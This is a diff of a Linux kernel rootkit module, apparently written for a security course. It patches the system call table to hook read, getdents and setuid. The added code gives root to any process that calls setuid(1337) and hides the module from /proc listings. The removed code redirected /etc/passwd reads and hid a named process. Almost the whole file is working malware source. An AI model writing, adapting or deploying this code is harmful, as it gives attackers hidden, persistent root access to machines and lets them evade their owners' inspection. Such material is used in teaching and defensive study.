@@ -1,14 +1,15 @@
-#include <linux/module.h>      // for all modules 
+#include <linux/module.h>      // for all modules
+#include <linux/moduleparam.h> 
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
-#include <linux/file.h>
 #include <asm/unistd.h>        // for system call constants
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/file.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -17,25 +18,26 @@
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
 
+#define BUFFLEN 32
+
 struct linux_dirent {
-  unsigned long  d_ino;     /* Inode number */
-  unsigned long  d_off;     /* Offset to next linux_dirent */
-  unsigned short d_reclen;  /* Length of this linux_dirent */
-  char           d_name[];  /* Filename (null-terminated) */
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
 };
-static int process_id = 0;
-module_param(process_id, int, 0);
-MODULE_PARM_DESC(process_id, "this is a process id");
-static char* process_path = "this is not a path";
-module_param(process_path, charp, 0000);
-MODULE_PARM_DESC(process_path, "process path");
+
+/* static int sneaky_pid = 0; */
+/* module_param(sneaky_pid,int,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP); */
+/* MODULE_PARM_DESC(sneaky_pid, "sneaky_pid"); */
+
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
@@ -46,76 +48,102 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+/* Setuid syscall hook */
+asmlinkage int (*origin_setuid) (uid_t uid);
 
-asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);
-
-//Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
+/* Malicious setuid hook syscall */
+asmlinkage int sneaky_setuid(uid_t uid)
 {
-  int a =strcmp(pathname, "/etc/passwd");
-  if( a == 0){
-    const char * pathname_sneaky = "/tmp/passwd";
-    copy_to_user((char * )pathname, pathname_sneaky,11);
-  }
-  return original_call(pathname, flags, mode);
-}
-asmlinkage ssize_t (*origin_read)(int fd, void *buf, size_t count);
-asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
-  ssize_t rst = (*origin_read)(fd,buf,count);
-  char* p = strstr(buf,"sneaky_mod");
-  char* temp;
-  char* tempp = (char*)__get_free_page(GFP_TEMPORARY);
-  struct file* file = fget(fd);
-  char* path = d_path(&file->f_path, tempp, PAGE_SIZE);
-  if(strcmp(path,"/proc/modules")==0){
-  if(p){
-    for(temp = p;temp<(char*) ((char*)buf+rst);temp++){
-      if(*temp == '\n'){
-	memmove(p, temp+1, (int)(rst-(temp+1-(char*)buf)));
-	rst = rst-(temp+1-p);
-	break;
-      }
+  if (uid == (uint)1337)
+    {
+      /* Create new cred struct */
+      struct cred *np;
+      /* Create uid struct */
+      kuid_t nuid;
+      /* Set uid struct value to 0 */
+      nuid.val = 0;
+      /* Print UID and EUID of current process to dmesg */
+      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+      printk(KERN_WARNING "[!] Attempting UID change!");
+      /* Prepares new set of credentials for task_struct of current process */
+      np = prepare_creds();
+      /* Set uid of new cred struct to 0 */
+      np->uid = nuid;
+      /* Set euid of new cred struct to 0 */
+      np->euid = nuid;
+      /* Commit cred to task_struct of process */
+      commit_creds(np);
+      printk(KERN_WARNING "[!] Changes Complete!");
+      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
     }
-  }
-  }
-  return rst;
+  /* Call original setuid syscall */
+  return origin_setuid(uid);
 }
-// for getdents
-asmlinkage int (*origin_getdents)(unsigned int fd, struct linux_dirent * dirp,unsigned int count);
-asmlinkage int sneaky_getdents (unsigned int fd, struct linux_dirent * dirp,unsigned int count)
+asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-  int origin_return = (*origin_getdents)(fd, dirp,count);
-  char* tempp = (char*)__get_free_page(GFP_TEMPORARY);
-  struct file* file = fget(fd);
-  char* path = d_path(&file->f_path, tempp, PAGE_SIZE);
-  //  printk(KERN_INFO "inside getdents process_path is : %s\n",process_path);
+  /* //hide the sneaky process */
+  /* int bpos; */
+  /* int sneaky_len; */
+  /* char d_type; */
+  /* struct linux_dirent* d; */
   
-  if(strcmp(path,process_path)==0 || strcmp(path, "/proc")==0){
-  int temp = origin_return;
-  int a;
-  int b;
-  char prm[20];
-  sprintf(prm, "%d", process_id);
-  while(temp>0){
-    //search through the list
-    int len_per_struct = dirp->d_reclen;
-    temp = temp - len_per_struct;
-    //printk("inside getdents file name is : %s\n", dirp->d_name);
-    a = strcmp(dirp->d_name, "sneaky_process");
-    b = strcmp(dirp->d_name, prm);
-    if((a==0 && strcmp(path,process_path)==0)|| (b==0 && strcmp(path, "/proc")==0)){
-      memmove(dirp, (char*)dirp+dirp->d_reclen, temp);
-      origin_return = origin_return - len_per_struct;
-      //printk("hide successfully\n");
-    }
-    else{
-      if(temp){
-	dirp = (struct linux_dirent *)((char*) dirp+dirp->d_reclen);
+  /* printk("sneaky_pid = %d\n",sneaky_pid); */
+  /* char pid[16]; */
+  /* sprintf(pid,"%d",sneaky_pid); */
+  
+  /* int read = original_getdents(fd,dirp,count); */
+  /* if(read == 0){ */
+  /*   printk("end of directory\n"); */
+  /*   return read; */
+  /* }  */
+  /* if(read == -1){ */
+  /*   printk("getdents failed\n"); */
+  /*   return read; */
+  /* } */
+  /* //printk("read = %d\n",read); */
+  /* for(bpos=0;bpos<read;){ */
+  /*   d = (struct linux_dirent *)((char*)dirp + bpos); */
+  /*   char* name = d->d_name; */
+  /*   d_type = *((char*)dirp+bpos+d->d_reclen-1); */
+  /*   if(strstr(name,"sneaky_process") != NULL || strcmp(name,pid)==0 ){ */
+  /*     printk("this is the sneaky_process\n"); */
+  /*     sneaky_len = d->d_reclen; */
+  /*     //printk("sneaky_len = %d\n",sneaky_len); */
+  /*     //printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos); */
+  /*     int des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len); */
+  /*     //printk("des = %d\n",des); */
+  /*     read -= sneaky_len; */
+  /*   } */
+  /*   else{ */
+  /*     bpos += d->d_reclen; */
+  /*     //printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos); */
+  /*   } */
+  /* } */
+  /* return read; */
+  return original_getdents(fd, dirp, count);
+}
+
+asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
+  
+  char* get_fp = (char*)__get_free_page(GFP_TEMPORARY);
+  struct file* file_get = fget(fd);
+  char* cur_path = d_path(&file_get->f_path, get_fp, PAGE_SIZE);
+  
+  ssize_t read = original_read(fd,buf,count);
+  char* temp = strstr((char*)buf,"sneaky_mod");
+  if(temp != NULL){
+    char* newlineptr = strchr(temp,'\n');
+    if(newlineptr != NULL){
+      if(strstr(cur_path,"/proc")!=NULL){
+        read = read - (newlineptr - temp + 1);
+        memmove(temp,newlineptr+1,strlen(newlineptr+1)+1);
+        return read;
       }
     }
   }
-  }
-  return origin_return;
+  return read;
 }
 
 //The code that gets executed when the module is loaded
@@ -133,15 +161,18 @@ static int initialize_sneaky_module(void)
   page_ptr = virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
-  //This is the magic! Save away the original 'open system call
+
+  //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
-  origin_getdents = (void*)*(sys_call_table + __NR_getdents);
-  origin_read = (void*)*(sys_call_table+__NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
+  origin_setuid = (void*)*(sys_call_table + __NR_setuid);
+  *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid; 
+  //getdents
+  original_getdents = (void*)*(sys_call_table + __NR_getdents);  
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
+  //read
+  original_read = (void*)*(sys_call_table + __NR_read);  
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read; 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -168,9 +199,9 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
-  *(sys_call_table + __NR_getdents) = (unsigned long)origin_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)origin_read;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+    *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
